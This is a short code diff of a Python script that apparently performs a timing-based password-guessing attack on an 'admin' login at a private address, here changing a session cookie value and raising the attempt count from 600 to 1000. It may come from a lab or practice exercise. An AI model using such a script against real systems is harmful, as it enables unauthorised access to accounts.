@@ -1,5 +1,3 @@
-import itertools
-import os
 from time import sleep
 
 import requests
@@ -9,7 +7,7 @@ from requests import RequestException
 username = "admin"
 target_url = "http://192.168.1.50"
 ip = '192.168.1.50'
-cookie = '9715f009ba0859cc07'
+cookie = '4c44c000ae01109a0a'
 
 data = {}
 
@@ -25,7 +23,7 @@ header = {'Host': target_url,
 
 def urlPostTiming(guess_password, passAnalized):
     if guess_password not in passAnalized:
-        for i in range(600):
+        for i in range(1000):
             try:
 
                 print('try number: {}'.format(i))
